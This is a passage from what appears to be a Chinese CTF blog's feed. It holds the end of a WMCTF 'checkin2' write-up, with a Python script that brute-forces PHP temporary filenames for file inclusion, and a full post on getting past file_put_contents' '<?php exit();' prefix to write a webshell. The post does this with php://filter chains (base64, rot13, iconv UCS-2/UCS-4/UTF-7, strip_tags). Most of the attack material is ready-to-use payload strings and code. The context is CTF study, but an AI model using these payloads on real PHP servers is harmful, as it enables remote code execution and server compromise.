class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    generate_tmp_files()</span><br></pre></td></tr></table></figure><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="attr">import</span> <span class="string">requests</span></span><br><span class="line"><span class="attr">import</span> <span class="string">string</span></span><br><span class="line"></span><br><span class="line"><span class="attr">charset</span> = <span class="string">string.digits + string.letters</span></span><br><span class="line"></span><br><span class="line"><span class="attr">host</span> = <span class="string">"web_checkin2.wmctf.wetolink.com"</span></span><br><span class="line"><span class="attr">port</span> = <span class="string">80</span></span><br><span class="line"><span class="attr">base_url</span> = <span class="string">"http://%s:%d" % (host, port)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">def</span> <span class="string">brute_force_tmp_files():</span></span><br><span class="line">    <span class="attr">for</span> <span class="string">i in charset:</span></span><br><span class="line">        <span class="attr">for</span> <span class="string">j in charset:</span></span><br><span class="line">            <span class="attr">for</span> <span class="string">k in charset:</span></span><br><span class="line">                <span class="attr">for</span> <span class="string">l in charset:</span></span><br><span class="line">                    <span class="attr">for</span> <span class="string">m in charset:</span></span><br><span class="line">                        <span class="attr">for</span> <span class="string">n in charset:</span></span><br><span class="line">                            <span class="attr">filename</span> = <span class="string">i + j + k + l + m + n</span></span><br><span class="line">                            <span class="attr">url</span> = <span class="string">"%s/index.php?content=/tmp/php%s" % (</span></span><br><span class="line">                                <span class="meta">base_url,</span> <span class="string">filename)</span></span><br><span class="line">                            <span class="attr">print</span> <span class="string">url</span></span><br><span class="line">                            <span class="attr">try</span>:<span class="string"></span></span><br><span class="line">                                <span class="attr">response</span> = <span class="string">requests.get(url)</span></span><br><span class="line">                                <span class="attr">if</span> <span class="string">'flag' in response.content:</span></span><br><span class="line">                                    <span class="attr">print</span> <span class="string">"[+] Include success!"</span></span><br><span class="line">                                    <span class="attr">return</span> <span class="string">True</span></span><br><span class="line">                            <span class="attr">except</span> <span class="string">Exception as e:</span></span><br><span class="line">                                <span class="attr">print</span> <span class="string">e</span></span><br><span class="line">    <span class="attr">return</span> <span class="string">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">def</span> <span class="string">main():</span></span><br><span class="line">    <span class="attr">brute_force_tmp_files()</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">if</span> <span class="string">__name__ == "__main__":</span></span><br><span class="line">    <span class="attr">main()</span></span><br></pre></td></tr></table></figure><h3 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h3><p>checkin刚放出的时候，由于配置错误成了白给题，所以修复了问题放出了checkin2。在出题的时候也很担心题目出得不好影响了比赛质量，争取之后遇到好的点的时候再继续分享<del>~</del></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;考点主要源于我之前再写文章 &lt;a href=&quot;https://cyc1e183.github.io/2020/04/03/关于file_put_contents的一些小测试/&quot;&gt;关于file_put_contents的一些小测试&lt;/a&gt; 中遇到的一些问题。题目源代码很简单👇&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;meta&quot;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;comment&quot;&gt;//PHP 7.0.33 Apache/2.4.25&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;error_reporting(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;$sandbox = &lt;span class=&quot;string&quot;&gt;&#39;/var/www/html/&#39;&lt;/span&gt; . md5($_SERVER[&lt;span class=&quot;string&quot;&gt;&#39;HTTP_X_REAL_IP&#39;&lt;/span&gt;]);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;@mkdir($sandbox);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;@chdir($sandbox);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;highlight_file(&lt;span class=&quot;keyword&quot;&gt;__FILE__&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;isset&lt;/span&gt;($_GET[&lt;span class=&quot;string&quot;&gt;&#39;content&#39;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    $content = $_GET[&lt;span class=&quot;string&quot;&gt;&#39;content&#39;&lt;/span&gt;];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(preg_match(&lt;span class=&quot;string&quot;&gt;&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;&lt;/span&gt;,$content))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;         &lt;span class=&quot;keyword&quot;&gt;die&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;&#39;hacker&#39;&lt;/span&gt;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(file_exists($content))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;require_once&lt;/span&gt;($content);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;echo&lt;/span&gt; $content;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;    file_put_contents($content,&lt;span class=&quot;string&quot;&gt;&#39;&amp;lt;?php exit();&#39;&lt;/span&gt;.$content);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;php&quot;&gt;&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Cyc1e的CTF之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84CTF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="file_put_contents" scheme="https://cyc1e183.github.io/tags/file-put-contents/"/>
    
      <category term="php://filter" scheme="https://cyc1e183.github.io/tags/php-filter/"/>
    
  </entry>
  
  <entry>
    <title>关于file_put_contents的一些小测试</title>
    <link href="https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/"/>
    <id>https://cyc1e183.github.io/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2020-04-03T06:16:42.000Z</published>
    <updated>2020-08-04T08:45:52.796Z</updated>
    
    <content type="html"><![CDATA[<p>昨天看了篇文章<a href="https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA" target="_blank" rel="noopener">一次“SSRF–&gt;RCE”的艰难利用</a>，被里面的各种骚操作给秀到了，发现<code>file_put_contents</code>这个很有意思，绕过<code>&lt;?php exit();</code>GetShell也经常有人提出不同的思路，这里简单的做一下测试和记录。</p><h1 id="file-put-contents-filename-”-lt-php-exit-”-content"><a href="#file-put-contents-filename-”-lt-php-exit-”-content" class="headerlink" title="file_put_contents($filename,”&lt;?php exit();”.$content);"></a>file_put_contents($filename,”&lt;?php exit();”.$content);</h1><blockquote><p><strong>前提</strong>：这种是前后两个变量不同，假设$filename,$content我们都可控情况</p></blockquote><p>这种情况相对较为简单，先捋清思路，$filename控制的写入的文件名，$content拼接在了<code>&lt;?php exit();</code>后，所以想要GetShell的话，就必须把<code>&lt;?php exit();</code>给干掉，而都知道$filename是控制文件名的，如果我们使用<strong>php://filter</strong>协议的话，这会先按<strong>php://filter</strong>规定的协议对$content进行解码后再写入协议，更强大的是<strong>php://filter</strong>还支持使用多个过滤器规则，也就是说我们可以来个连环操作。所以思路很简单，目标就是把<code>&lt;?php exit();</code>解码为php不认识的字符，而我们构造的内容能够正常的解码出来就可以。这个在phith0n之前的文章里有了很详细的介绍<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">传送门</a>，这里简单的介绍一下</p><h2 id="0x01-Base64编码"><a href="#0x01-Base64编码" class="headerlink" title="0x01 Base64编码"></a>0x01 Base64编码</h2><p>最常用的就是base64编码了，通过解码把<code>&lt;?php exit();</code>解码为乱码，而后面我们传入的webshell的base64内容被正常解码，就可以直接干掉<code>&lt;?php exit();</code>得到一个shell了,不过由于<code>&lt;?php exit();</code>中只有phpexit参与了解码，由于base64解码时4转3,所以需要补一位如👇</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo();<span class="meta">?&gt;</span> =&gt; PD9waHAgcGhwaW5mbygpOz8+ =&gt; aPD9waHAgcGhwaW5mbygpOz8+ -&gt; $content</span><br><span class="line">php:<span class="comment">//filter/write=convert.base64-decode/resource=Cyc1e.php  -&gt; $filename</span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403151021554.png" alt></p><h2 id="0x02-Rot13编码"><a href="#0x02-Rot13编码" class="headerlink" title="0x02 Rot13编码"></a>0x02 Rot13编码</h2><p>同样，也可以利用rot13编码来绕过，原理和Base64编码是一样的，就不多赘述了，如下👇</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span> =&gt; <span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span> -&gt; $content</span><br><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.rot13/resource=Cyc1e.php  -&gt; $filename</span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403151425262.png" alt></p><p>这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag）</p><h2 id="0x03-组合拳"><a href="#0x03-组合拳" class="headerlink" title="0x03 组合拳"></a>0x03 组合拳</h2><p>我们可以利用<strong>php://filter</strong>字符串处理方法&amp;&amp;编码的方法绕过<code>&lt;?php exit();</code>，相对于直接编码就有点多此一举了，不过知道有这个方法就好了，例如利用strip_tags方法来直接去除xml，而我们传入的shell是base64编码过的，所以不会被去除，再解码即可，前面也说了<strong>php://filter</strong>是支持使用多个多滤器的，所以构造如下👇</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span> =&gt; PD9waHAgcGhwaW5mbygpOz8+ =&gt;<span class="meta">?&gt;</span>PD9waHAgcGhwaW5mbygpOz8+ -&gt; $content <span class="comment">#这里由于`&lt;?php exit();`不是完整的标签，所以需要补上’?&gt;‘进行补全</span></span><br><span class="line">php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.strip_tags|<span class="built_in">convert</span>.base64-decode/resource=Cyc1e.php  -&gt; $filename</span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403152859574.png" alt></p><h1 id="file-put-contents-a-”-lt-php-exit-”-a"><a href="#file-put-contents-a-”-lt-php-exit-”-a" class="headerlink" title="file_put_contents($a,”&lt;?php exit();”.$a);"></a>file_put_contents($a,”&lt;?php exit();”.$a);</h1><blockquote><p><strong>前提</strong>：这种是前后两个变量相同，假设$a可控情况</p></blockquote><p>这种相同变量的构造方式和不同变量的构造方式思路是大差不差的，都是需要干掉<code>&lt;?php exit();</code>，只不过构造起来相对更复杂一些，这里也简单记录下测试的内容👇</p><h2 id="0x01-Base64"><a href="#0x01-Base64" class="headerlink" title="0x01 Base64"></a>0x01 Base64</h2><p>这里和上面对应上，不过经过个人测试，直接只用Base64的方式是<strong>不行的</strong>！（如果有构造出来的，分享一下），接下来讲讲为何个人觉得不行 ~</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file<span class="constructor">_put_contents($<span class="params">a</span>,<span class="string">"&lt;?php exit();"</span>.$<span class="params">a</span>)</span>;</span><br></pre></td></tr></table></figure><p>根据前面介绍的不同变量的构造方法，很容易拓展到相同的变量，同样利用<strong>php://filter</strong>来构造，反正后面是写入的内容，只要在后面解码的时候把shell解码出来，不需要的东西解码成乱码即可，而Base64构造的话，例如</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">a</span> = php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="built_in">convert</span>.base64-decode|PD9waHAgcGhwaW5mbygpOz8+|/resource=Cyc1e.php</span><br></pre></td></tr></table></figure><p>构造的shell可以放在过滤器的位置和文件名位置都可以（其他编码有时候会有空格什么的乱码，文件名不一定好用），php://filter面对不可用的规则是报个Warning，然后跳过继续执行的（不会退出），所以按理说这样构造是<strong>“很完美”</strong>的，我们看下base-decode哪些字符👇</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php<span class="regexp">//</span>filter<span class="regexp">/write=convertbase64decodePD9waHAgcGhwaW5mbygpOz8+/</span>resource=Cyc1e.php</span><br></pre></td></tr></table></figure><p>而默认情况下base64编码是以 <code>=</code> 作为结尾的，所以正常解码的时候到了 <code>=</code> 就解码结束了，即使我们构造payload的时候不用<code>write=</code>，但是在最后获取文件名的时候<code>resource=</code>中的 <code>=</code> 过不掉，所以导致过滤器解码失败，从而报错（不过还是会创建文件的，内容由于解码过程出错了，就都丢弃了）👇</p><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160120749.png" alt></p><p>我们也可以简单的测试一下是否是 <code>=</code> 出的问题，</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#3.php</span></span><br><span class="line">&lt;?php</span><br><span class="line">$filename=<span class="string">"php://filter/write=convert.base64-decode/resource=Cyc1e.php"</span>;</span><br><span class="line">$content=<span class="string">"PD9waHAgcGhwaW5mbygpOz8+"</span>;</span><br><span class="line">file_put_contents($filename,<span class="string">"&lt;?PHP exit();//="</span>.$content);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160208500.png" alt></p><p>结果是一样的，所以可以确定是 <code>=</code> 出的问题，要是有绕过的构造方法，欢迎分享。</p><h2 id="0x02-Rot13"><a href="#0x02-Rot13" class="headerlink" title="0x02 Rot13"></a>0x02 Rot13</h2><p>rot13编码就不存在base64的问题，所以和前面base64构造的思路一样👇</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">a</span> = php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.rot13|<span class="meta">&lt;?</span>cuc cucvasb();<span class="meta">?&gt;</span>|/resource=Cyc1e.php</span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403160545137.png" alt></p><p>和前面提到的一样，这种方法是需要服务器<strong>没有开启短标签</strong>的时候才可以使用（默认情况是没开启的：php.ini中的short_open_tag（再补充一下，linux下默认是没有开启的））</p><h2 id="0x03-iconv字符编码转换"><a href="#0x03-iconv字符编码转换" class="headerlink" title="0x03 iconv字符编码转换"></a>0x03 iconv字符编码转换</h2><p>这种方法由于之前没有见过，所以感觉这波操作比我的亚索还要秀~，想法是一样的，通过字符转换把<code>&lt;?php exit();</code>转成不能解析的，这里采用的是UCS-2或者UCS-4编码方式（当然还有很多，比如utf-8和utf-7），而我们构造的转成可正常解析的。👇</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#echo iconv(<span class="string">"UCS-2LE"</span>,<span class="string">"UCS-2BE"</span>,'&lt;?php phpinfo()<span class="comment">;?&gt;');</span></span><br><span class="line">?&lt;hp phpipfn(<span class="name">o</span><span class="comment">;)&gt;?</span></span><br></pre></td></tr></table></figure><p>这里用的是UCS-2，当然我们也可以用UCS-4👇</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo iconv(<span class="string">"UCS-4LE"</span>,<span class="string">"UCS-4BE"</span>,'aa&lt;?php phpinfo()<span class="comment">;?&gt;');</span></span><br><span class="line">?&lt;aa phpiphp(<span class="name">ofn&gt;</span>?<span class="comment">;)</span></span><br></pre></td></tr></table></figure><p>通过UCS-2或者UCS-4的方式，对目标字符串进行2/4位一反转，也就是说构造的需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转，那我们就可以利用这种过滤器进行编码转换绕过了，构造payload👇</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$a=<span class="string">'php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=Cyc1e.php'</span><span class="comment">;</span></span><br><span class="line">**<span class="literal">or</span>**</span><br><span class="line">$a=<span class="string">'php://filter//convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=Cyc1e.php'</span><span class="comment">;</span></span><br><span class="line"><span class="meta">#由于是4位一反转，所以需要保证?&lt;aa phpiphp(ofn&gt;?<span class="comment">;)之前字符个数是4的倍数，所以需要补3个字符</span></span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403162535114.png" alt></p><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403162950176.png" alt></p><p>当然这种方法对于前后不同变量也是一样适用的<del>~</del></p><h2 id="0x04-组合拳"><a href="#0x04-组合拳" class="headerlink" title="0x04 组合拳"></a>0x04 组合拳</h2><h3 id="第一套连招"><a href="#第一套连招" class="headerlink" title="第一套连招"></a>第一套连招</h3><p>和前后不同的变量的利用一样，相同变量一样可以使用组合拳，这里就用UCS-2和rot13举一个例子吧，知道可以这样的意思👇</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="attr">a</span> = 'php://filter/<span class="attr">write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc</span> cucvcsa(b;)&gt;?/<span class="attr">resource=Cyc1e.php';</span> <span class="comment">#同样需要补位，这里补了一个x</span></span><br></pre></td></tr></table></figure><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403165229869.png" alt></p><h3 id="第二套连招"><a href="#第二套连招" class="headerlink" title="第二套连招"></a>第二套连招</h3><p>前面介绍单独用base64编码是不可行的，那么来一套组合拳是否可以呢？答案肯定是可以的，这里感谢大兄弟<a href="http://yulige.top" target="_blank" rel="noopener">郁离歌</a>提供的方法，通过iconv将utf8编码转为utf7编码，从而把 <strong>=</strong> 给转了，就不会影响到base64的解码了👇</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a='php://filter/<span class="built_in">convert</span>.iconv.utf-<span class="number">8.</span>utf-<span class="number">7</span>|<span class="built_in">convert</span>.<span class="built_in">base64</span>-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php'; #<span class="built_in">base64</span>编码前补了AA，原理一样，补齐位数</span><br></pre></td></tr></table></figure><p>我们看一下转码后的结果</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">UTF-8</span>:<span class="attribute">php</span>:<span class="comment">//filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php</span></span><br><span class="line">👇</span><br><span class="line"><span class="attribute">UTF-7</span>:<span class="attribute">php</span>:<span class="comment">//filter/convert.iconv.utf-8.utf-7+AHw-convert.base64-decode+AHw-AAPD9waHAgcGhwaW5mbygpOz8+-/resource+AD0-Cyc1e.php</span></span><br></pre></td></tr></table></figure><p>这样就成功的把 <strong>=</strong> 给转了，base64编码没有受到影响，一样可以正常的解码~</p><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403193558288.png" alt></p><p>所以对于base64的运用，只要找到一个能把 <strong>=</strong> 转了同时又不影响base64编码后的字符的转码方式即可</p><h3 id="第三套连招"><a href="#第三套连招" class="headerlink" title="第三套连招"></a>第三套连招</h3><p>我们来用一下strip_tags方法&amp;&amp;base64的组合，不过之前构造的这种方法有局限性，要求服务器是linux系统，所以之前没写。因为前面介绍过strip_tags去除的是完整的标签以及内容，而base64要求中间不能出现 <code>=</code> 所以把他们二者组合起来👇</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = 'php://filter/write=<span class="built_in">string</span>.strip_tags|<span class="built_in">convert</span>.<span class="built_in">base64</span>-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php';</span><br></pre></td></tr></table></figure><p>理解起来也很简单，在文件名前加上<code>?&gt;</code>把<code>&lt;?php exit();</code>闭合，同时 = 也在闭合标签之间，所以利用strip_tags处理的时候直接把<code>&lt;?php ...... ?&gt;</code>内的所有内容都删除了，然后对剩下的部分，也就是<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>进行base64解码，为什么说这种构造Windows不行呢，因为Windows不支持文件名中有<code>?</code>、<code>&gt;</code>这类字符。</p><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403195815117.png" alt></p><p>如果觉得文件名太难看了，那么可以利用<code>../</code>来构造👇</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a = 'php://filter/write=<span class="built_in">string</span>.strip_tags|<span class="built_in">convert</span>.<span class="built_in">base64</span>-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+/../Cyc1e.php';</span><br></pre></td></tr></table></figure><p>把<code>?&gt;PD9waHAgcGhwaW5mbygpOz8+</code>作为目录名（不管存不存在），再用<code>../</code>回退一下，这样创建出来的文件名为Cyc1e.php，这样创建出来的文件名就正常了</p><p><img src="/2020/04/03/%E5%85%B3%E4%BA%8Efile_put_contents%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%B5%8B%E8%AF%95/image-20200403202806799.png" alt></p><p>这里为何不用strip_tags呢？因为rot13转换的同样会被strip_tags方法给删除了，而UCS-2或UCS-4构造的也同样会被strip_tags方法给删除，所以需要找其他的编码方式进行构造，这里做个小tips，由于strip_tags去除的是一个闭合的标签所以<code>?&gt;</code>可以放在我们构造的shell编码前，这样在contents上就直接把shell前的字符去了，只要shell的编码不会被删除，就可以解码回shell写入文件中，本菜懒，就不一个一个过滤器试了<del>~</del></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单的记录了一下本菜的测试过程，过滤器只用了提到的和常用的，当然<strong>php://filter</strong>还有其他的过滤器是可以用的，不过总结起来说，思路都是一样的，就是如何把<code>&lt;?php exit();</code>给<strong>”吃掉“</strong>，让自己构造的shell可以正常运行，简单总结了这种方法，当然，方法万千，师傅们有好的方法也欢迎分享（白嫖）<del>~</del></p><p>tips：<code>file_put_contents</code>和<code>file_get_contents</code>这两个函数还是很有意思的，file_get_contents也有很多特性，下次有时间再写</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;昨天看了篇文章&lt;a href=&quot;https://mp.weixin.qq.com/s/kfYF157ux_VAOymU5l5RFA&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;一次“SSRF–&amp;gt;RCE”的艰难利用&lt;/a&gt;，被里面的各种骚操作给秀到了，发现&lt;code&gt;file_put_contents&lt;/code&gt;这个很有意思，绕过&lt;code&gt;&amp;lt;?php exit();&lt;/code&gt;GetShell也经常有人提出不同的思路，这里简单的做一下测试和记录。&lt;/p&gt;
